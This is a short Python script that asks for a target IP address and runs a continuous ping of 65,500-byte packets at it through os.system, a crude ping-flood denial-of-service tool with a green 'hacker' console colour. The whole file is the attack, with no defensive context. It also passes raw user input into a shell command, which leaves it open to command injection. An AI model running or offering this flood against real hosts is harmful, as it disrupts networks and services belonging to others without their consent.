try:
	from os import system
	targetIP=input("targetIP:")
	system("color a & ping -a -l 65500 -i 255 %s -t"%(targetIP))
	del targetIP
except:
	pass